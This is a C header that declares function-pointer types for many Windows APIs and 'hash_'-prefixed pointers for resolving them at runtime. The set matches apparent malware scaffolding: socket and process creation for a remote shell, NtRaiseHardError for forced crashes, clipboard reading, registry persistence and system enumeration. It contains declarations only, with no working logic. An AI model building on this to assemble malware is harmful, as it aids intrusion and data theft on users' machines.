#pragma once

#include <windows.h>
#include "wininet.h"
#include <lmaccess.h>

typedef BOOL(WINAPI* _OpenProcessToken)(
	HANDLE  ProcessHandle,
	DWORD   DesiredAccess,
	PHANDLE TokenHandle
	);

typedef BOOL(WINAPI* _InternetSetOptionW)(
	HINTERNET hInternet,
	DWORD     dwOption,
	LPVOID    lpBuffer,
	DWORD     dwBufferLength
	);

typedef BOOL(WINAPI* _HttpSendRequestA)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength
	);

typedef BOOL(WINAPI* _InternetCloseHandle)(
	HINTERNET hInternet
	);

typedef BOOL(WINAPI* _InternetQueryOptionW)(
	HINTERNET hInternet,
	DWORD     dwOption,
	LPVOID    lpBuffer,
	LPDWORD   lpdwBufferLength
	);

typedef DWORD(WINAPI* _NetUserGetInfo)(
	LPCWSTR servername,
	LPCWSTR username,
	DWORD   level,
	LPBYTE* bufptr
	);

typedef NET_API_STATUS(__stdcall* _NetUserEnum)(LPCWSTR, DWORD, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD);

typedef DWORD(WINAPI* _NetApiBufferFree)(
	_Frees_ptr_opt_ LPVOID Buffer
	);

typedef HANDLE(WINAPI* _FindFirstFileW)(
	LPCWSTR            lpFileName,
	LPWIN32_FIND_DATAW lpFindFileData
	);

typedef BOOL(WINAPI* _FindNextFileW)(
	HANDLE             hFindFile,
	LPWIN32_FIND_DATAW lpFindFileData
	);

typedef BOOL(WINAPI* _DeleteFileA)(
	LPCSTR lpFileName
	);

typedef DWORD(WINAPI* _GetCurrentProcessId)();

typedef BOOL(WINAPI* _TerminateProcess)(
	HANDLE hProcess,
	UINT   uExitCode
	);

typedef HANDLE(WINAPI* _OpenProcess)(
	DWORD dwDesiredAccess,
	BOOL  bInheritHandle,
	DWORD dwProcessId
	);

typedef BOOL(WINAPI* _CreateProcessA)(
	LPCSTR                lpApplicationName,
	LPSTR                 lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL                  bInheritHandles,
	DWORD                 dwCreationFlags,
	LPVOID                lpEnvironment,
	LPCSTR                lpCurrentDirectory,
	LPSTARTUPINFOA        lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	);

typedef DWORD(WINAPI* _GetCurrentThreadId)();

typedef DWORD(WINAPI* _GetModuleFileNameA)(
	HMODULE hModule,
	LPSTR   lpFilename,
	DWORD   nSize
	);

typedef PVOID(WINAPI* _OpenClipboard)(HWND);

typedef HANDLE(WINAPI* _GetClipboardData)(
	UINT uFormat
	);

typedef BOOL(WINAPI* _CloseClipboard)();

typedef BOOL(WINAPI* _CopyFileA)(
	LPCSTR lpExistingFileName,
	LPCSTR lpNewFileName,
	BOOL   bFailIfExists
	);

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef HINTERNET(WINAPI* _InternetOpenA)(
	LPCSTR lpszAgent,
	DWORD  dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD  dwFlags
	);

typedef HINTERNET(WINAPI* _InternetConnectA)(
	HINTERNET     hInternet,
	LPCSTR        lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR        lpszUserName,
	LPCSTR        lpszPassword,
	DWORD         dwService,
	DWORD         dwFlags,
	DWORD_PTR     dwContext
	);

typedef HINTERNET(WINAPI* _HttpOpenRequestA)(
	HINTERNET hConnect,
	LPCSTR    lpszVerb,
	LPCSTR    lpszObjectName,
	LPCSTR    lpszVersion,
	LPCSTR    lpszReferrer,
	LPCSTR* lplpszAcceptTypes,
	DWORD     dwFlags,
	DWORD_PTR dwContext
	);

typedef BOOL(WINAPI* _HttpSendRequestA)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength
	);

typedef void(WINAPI* _ExitProcess)(
	UINT uExitCode
	);

typedef BOOL(WINAPI* _PathMatchSpecW)(
	LPCWSTR pszFile,
	LPCWSTR pszSpec
	);

typedef BOOL(WINAPI* _FindClose)(
	HANDLE hFindFile
	);

typedef BOOL(WINAPI* _CloseHandle)(
	HANDLE hObject
	);

typedef BOOL(WINAPI* _InternetQueryOptionA)(
	HINTERNET hInternet,
	DWORD     dwOption,
	LPVOID    lpBuffer,
	LPDWORD   lpdwBufferLength
	);

typedef BOOL(WINAPI* _InternetSetOptionA)(
	HINTERNET hInternet,
	DWORD     dwOption,
	LPVOID    lpBuffer,
	DWORD     dwBufferLength
	);

typedef BOOL(WINAPI* _InternetReadFile)(
	HINTERNET hFile,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
	);

typedef LSTATUS(WINAPI* _RegSetValueExA)(
	HKEY,
	LPCSTR,
	DWORD,
	DWORD,
	const BYTE*,
	DWORD);

typedef LSTATUS(WINAPI* _RegOpenKeyExA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	DWORD  ulOptions,
	REGSAM samDesired,
	PHKEY  phkResult
	);

typedef LSTATUS(WINAPI* _RegCloseKey)(
	HKEY hKey
	);

typedef LSTATUS(WINAPI* _RegDeleteKeyValueA)(
	HKEY   hKey,
	LPCSTR lpSubKey,
	LPCSTR lpValueName
	);

typedef NTSTATUS(NTAPI* _RtlAdjustPrivilege) (
	ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled);
typedef NTSTATUS(NTAPI* _NtRaiseHardError)(
	NTSTATUS error_status,
	ULONG number_of_parameters,
	ULONG unicode_string_parameter_mask,
	PULONG_PTR parameters,
	ULONG response_option,
	PULONG reponse);

typedef LPVOID(WINAPI* _VirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef BOOL(WINAPI* _VirtualFree)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  dwFreeType
	);

typedef int(WINAPI* _WSAStartup)(
	WORD      wVersionRequired,
	LPWSADATA lpWSAData
	);

typedef INT(WINAPI* _getaddrinfo)(
	PCSTR           pNodeName,
	PCSTR           pServiceName,
	const ADDRINFOA* pHints,
	PADDRINFOA* ppResult
	);

typedef int(WINAPI* _connect)(
	SOCKET         s,
	const sockaddr* name,
	int            namelen
	);

typedef int(WINAPI* _recv)(
	SOCKET s,
	char* buf,
	int    len,
	int    flags
	);

typedef int(WINAPI* _closesocket)(
	SOCKET s
	);

typedef int(WINAPI* _WSACleanup)();

typedef DWORD(WINAPI* _WaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
	);

typedef SOCKET(WINAPI* _WSASocketW)(
	int                 af,
	int                 type,
	int                 protocol,
	LPWSAPROTOCOL_INFOW lpProtocolInfo,
	GROUP               g,
	DWORD               dwFlags
	);

typedef HANDLE(WINAPI* _CreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);

typedef BOOL(WINAPI* _GetUserNameA)(
	LPSTR   lpBuffer,
	LPDWORD pcbBuffer
	);

typedef void(WINAPI* _GetSystemInfo)(
	LPSYSTEM_INFO lpSystemInfo
	);

typedef BOOL(WINAPI* _GetComputerNameA)(
	LPSTR   lpBuffer,
	LPDWORD nSize
	);

typedef BOOL(WINAPI* _OpenProcessToken)(
	HANDLE  ProcessHandle,
	DWORD   DesiredAccess,
	PHANDLE TokenHandle
	);

typedef HANDLE(WINAPI* _GetCurrentProcess)();

typedef BOOL(WINAPI* _GetTokenInformation)(
	HANDLE                  TokenHandle,
	TOKEN_INFORMATION_CLASS TokenInformationClass,
	LPVOID                  TokenInformation,
	DWORD                   TokenInformationLength,
	PDWORD                  ReturnLength
	);

//--------------------------------------------------------------------------

static _CreateThread hash_CreateThread = NULL;
static _WSASocketW hash_WSASocketW = NULL;
static _WSAStartup hash_WSAStartup = NULL;
static _getaddrinfo hash_getaddrinfo = NULL;
static _connect hash_connect = NULL;
static _recv hash_recv = NULL;
static _closesocket hash_closesocket = NULL;
static _WSACleanup hash_WSACleanup = NULL;
static _WaitForSingleObject hash_WaitForSingleObject = NULL;
static _RtlAdjustPrivilege hash_RtlAdjustPrivilege = NULL;
static _NtRaiseHardError hash_NtRaiseHardError = NULL;
static _InternetOpenA hash_InternetOpenA = NULL;
static _InternetConnectA hash_InternetConnectA = NULL;
static _HttpOpenRequestA hash_HttpOpenRequestA = NULL;
static _HttpSendRequestA hash_HttpSendRequestA = NULL;
static _InternetCloseHandle hash_InternetCloseHandle = NULL;
static _InternetQueryOptionA hash_InternetQueryOptionA = NULL;
static _InternetSetOptionA hash_InternetSetOptionA = NULL;
static _InternetReadFile hash_InternetReadFile = NULL;
static _NtQuerySystemInformation hash_NtQuerySystemInformation = NULL;
static _RegSetValueExA hash_RegSetValueExA = NULL;
static _RegOpenKeyExA hash_RegOpenKeyExA = NULL;
static _RegCloseKey hash_RegCloseKey = NULL;
static _RegDeleteKeyValueA hash_RegDeleteKeyValueA = NULL;
static _VirtualAlloc hash_VirtualAlloc = NULL;
static _VirtualFree hash_VirtualFree = NULL;
static _OpenProcessToken hash_OpenProcessToken = NULL;
static _FindFirstFileW hash_FindFirstFileW = NULL;
static _FindNextFileW hash_FindNextFileW = NULL;
static _DeleteFileA hash_DeleteFileA = NULL;
static _TerminateProcess hash_TerminateProcess = NULL;
static _OpenProcess hash_OpenProcess = NULL;
static _GetCurrentThreadId hash_GetCurrentThreadId = NULL;
static _GetModuleFileNameA hash_GetModuleFileNameA = NULL;
static _OpenClipboard hash_OpenClipboard = NULL;
static _GetClipboardData hash_GetClipboardData = NULL;
static _CloseClipboard hash_CloseClipboard = NULL;
static _ExitProcess hash_ExitProcess = NULL;
static _PathMatchSpecW hash_PathMatchSpecW = NULL;
static _FindClose hash_FindClose = NULL;
static _CloseHandle hash_CloseHandle = NULL;
static _CopyFileA hash_CopyFileA = NULL;
static _CreateProcessA hash_CreateProcessA = NULL;
static _GetUserNameA hash_GetUserNameA = NULL;
static _GetSystemInfo hash_GetSystemInfo = NULL;
static _GetComputerNameA hash_GetComputerNameA = NULL;
static _GetCurrentProcessId hash_GetCurrentProcessId = NULL;
static _GetCurrentProcess hash_GetCurrentProcess = NULL;
static _GetTokenInformation hash_GetTokenInformation = NULL;
